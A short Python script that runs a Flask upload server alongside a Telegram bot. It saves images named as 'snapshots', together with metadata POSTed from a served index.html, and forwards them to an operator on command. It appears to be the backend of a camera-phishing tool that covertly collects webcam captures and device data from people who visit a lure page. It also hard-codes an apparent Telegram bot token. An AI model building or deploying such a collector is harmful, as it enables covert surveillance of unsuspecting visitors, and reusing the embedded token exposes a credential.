import os, threading, json
from flask import Flask, request, send_from_directory
from telegram.ext import ApplicationBuilder, CommandHandler
from datetime import datetime

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
for folder in ["images", "metadata", "sent"]:
    os.makedirs(os.path.join(BASE_DIR, folder), exist_ok=True)

# متغير تحكم لتشغيل وإيقاف السيرفر
server_running = False
app = Flask(__name__)

@app.route('/', methods=['GET'])
def index(): return send_from_directory(BASE_DIR, 'index.html')

@app.route('/upload', methods=['POST'])
def upload():
    if not server_running: return 'Server stopped', 503
    image = request.files.get('image')
    metadata = request.form.get('metadata')
    if image:
        ts = datetime.now().strftime('%Y%m%d_%H%M%S')
        image.save(os.path.join(BASE_DIR, "images", f'snapshot_{ts}.png'))
        with open(os.path.join(BASE_DIR, "metadata", 'latest.json'), 'w') as f:
            json.dump({'data': json.loads(metadata) if metadata else {}}, f)
        return 'Uploaded', 200
    return 'No image', 400

# تشغيل Flask في خيط منفصل
def run_flask(): app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 5000)))
threading.Thread(target=run_flask, daemon=True).start()

# أوامر البوت
async def start(u, c):
    global server_running
    server_running = True
    await u.message.reply_text("✅ Server started! You can receive images now.")

async def stop(u, c):
    global server_running
    server_running = False
    await u.message.reply_text("🛑 Server stopped! No more images will be saved.")

async def images(u, c):
    img_dir = os.path.join(BASE_DIR, "images")
    files = [f for f in os.listdir(img_dir) if f.lower().endswith((".jpg", ".png"))]
    if not files: await u.message.reply_text("⚠️ No images found"); return
    for f in files:
        with open(os.path.join(img_dir, f), "rb") as img: await u.message.reply_photo(photo=img)
        os.replace(os.path.join(img_dir, f), os.path.join(BASE_DIR, "sent", f))

if __name__ == '__main__':
    bot_app = ApplicationBuilder().token("8612074749:AAHGvzF43cf5AkwzGhEDJHgvwNRF2KaO2qg").build()
    bot_app.add_handler(CommandHandler("start", start))
    bot_app.add_handler(CommandHandler("stop", stop))
    bot_app.add_handler(CommandHandler("images", images))
    bot_app.run_polling()
    
